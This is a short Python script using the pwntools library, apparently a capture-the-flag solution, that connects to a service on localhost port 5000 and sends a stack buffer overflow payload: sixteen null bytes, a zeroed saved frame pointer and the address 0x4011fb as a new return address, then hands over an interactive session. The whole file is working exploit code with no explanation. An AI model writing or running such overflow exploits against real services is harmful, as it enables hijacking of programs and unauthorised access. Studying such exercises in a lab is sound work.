from pwn import *

r = remote("localhost", 5000)

r.sendline(b'\0'*0x10 + p64(0) + p64(0x4011fb))

r.interactive()